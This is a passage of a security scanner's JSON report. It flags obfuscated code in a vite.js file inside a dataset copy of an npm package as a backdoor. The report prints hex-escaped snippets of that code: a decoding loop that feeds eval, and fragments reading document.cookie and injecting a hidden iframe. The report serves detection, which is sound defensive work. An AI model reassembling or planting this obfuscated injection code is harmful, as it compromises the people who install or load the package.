            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 2663,
                  "endLine": 4,
                  "endColumn": 3091,
                  "snippet": {
                    "text": "\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74",
                    "rendered": {
                      "text": "\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74",
                      "markdown": "`\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36\\x66\\x37\\x33\\x36\\x39\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x33\\x61\\x36\\x31\\x36\\x32\\x37\\x33\\x36\\x66\\x36\\x63\\x37\\x35\\x37\\x34\\x36\\x35\\x33\\x62\", \"\\x68\\x2c\\x64\\x74\\x65\\x66\\x68\\x2b\\x32\\x29\\x2c\\x20\\x31\\x36\\x29\\x2b\\x22\\x2c\\x22\\x3b\\x7d\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x30\\x2c\\x6e\\x61\\x64\\x74\\x66\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x2d\\x31\\x29\\x3b\\x65\\x76\\x61\\x6c\\x28\\x65\\x76\\x61\\x6c\\x28\\x27\\x53\\x74`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 2231,
                  "endLine": 4,
                  "endColumn": 2659,
                  "snippet": {
                    "text": "\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", \"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36",
                    "rendered": {
                      "text": "\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", \"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36",
                      "markdown": "`\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", \"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x32\\x36\\x66\\x36\\x34\\x37\\x39\\x32\\x65\\x36\\x31\\x37\\x30\\x37\\x30\\x36\\x35\\x36\\x65\\x36\\x34\\x34\\x33\\x36\\x38\\x36\\x39\\x36\\x63\\x36\\x34\\x32\\x38\", \"\\x31\\x33\\x35\\x33\\x31\\x33\\x31\\x33\\x36\\x32\\x32\\x33\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x65\\x36\\x39\\x36\\x65\\x36\\x65\\x36\\x35\\x37\\x32\\x34\\x38\\x35\\x34\\x34\\x64\\x34\\x63\\x33\\x64\\x32\\x32\\x33\\x63\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x30\\x37\\x33\\x37\\x34\\x37\\x39\\x36\\x63\\x36\\x35\\x33\\x64\\x32\\x37\\x37\\x30\\x36`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 1799,
                  "endLine": 4,
                  "endColumn": 2227,
                  "snippet": {
                    "text": "\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", \"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36",
                    "rendered": {
                      "text": "\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", \"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36",
                      "markdown": "`\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x61\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x64\\x37\\x36\\x36\\x31\\x37\", \"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 1367,
                  "endLine": 4,
                  "endColumn": 1795,
                  "snippet": {
                    "text": "\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", \"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30",
                    "rendered": {
                      "text": "\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", \"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30",
                      "markdown": "`\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", \"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 935,
                  "endLine": 4,
                  "endColumn": 1363,
                  "snippet": {
                    "text": "\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", 